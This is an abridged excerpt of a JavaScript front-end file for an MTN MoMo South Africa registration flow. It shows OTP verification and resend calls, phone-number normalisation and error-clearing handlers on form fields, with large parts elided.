// ============================================================
// script.js – MTN MoMo South Africa  (v7.1 FINAL)
// No inline handlers · All wired via addEventListener
// ============================================================
'use strict';
...
async function submitRegistrationOtp() {
    ...
    try {
        ...
        setTimeout(function () { goTo('page-registration-pin'); }, 500);
    } catch (e) {
        setBtnLoading(btn, false, 'Verify OTP');
...
async function resendRegistrationOtp() {
    try {
        var data = await apiCall('/api/registration/resend-otp', {
            method: 'POST',
...
function bindInputNormalizers() {
    ...
    ['regPhone','s2ph','s3kp','gPhone','loginPhone'].forEach(function (id) {
        var el = document.getElementById(id);
        if (el) el.addEventListener('input', function () { normalizePhone(id); clearErr((id === 'regPhone') ? 'regErr' : (id.indexOf('s2') === 0 ? 's2Err' : id.indexOf('s3') === 0 ? 's3Err' : id.indexOf('g') === 0 ? 'gErr' : 'loginErr')); });
    });
    ['regEmail','regTnc','s2fi','s2la','s2em','s3in','s3kn','gName','gRel','gConfirm','s1am','s1pu'].forEach(function (id) {
        var el = document.getElementById(id);
        if (el) el.addEventListener('input', function () {
            var map = { regEmail: 'regErr', regTnc: 'regErr', s2fi: 's2Err', s2la: 's2Err', s2em: 's2Err', s3in: 's3Err', s3kn: 's3Err', gName: 'gErr', gRel: 'gErr', gConfirm: 'gErr', s1am: 's1Err', s1pu: 's1Err' };
            clearErr(map[id] || 'regErr');
        });
    });
}
...
function wireAllHandlers() {
    ...
    bindClick('regResendOtpBtn', resendRegistrationOtp);
